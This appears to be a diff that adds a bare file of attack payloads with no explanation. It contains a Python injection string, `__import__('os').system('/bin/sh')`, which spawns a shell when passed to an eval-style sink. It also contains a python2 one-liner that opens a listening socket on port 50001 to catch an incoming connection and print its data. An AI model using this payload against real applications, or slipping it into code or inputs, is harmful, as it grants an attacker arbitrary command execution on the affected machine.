@@ -1,0 +1,3 @@
+__import__('os').system('/bin/sh')
+
+python2 -c 'import socket; import sys; used_port=50001; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.bind(("0.0.0.0", used_port)); s.listen(1); print("Listening on port", used_port); sys.stdout.flush(); conn, addr = s.accept(); print("Connection from:", addr); sys.stdout.flush(); print("Received data:", conn.recv(1024)); sys.stdout.flush(); conn.close()'
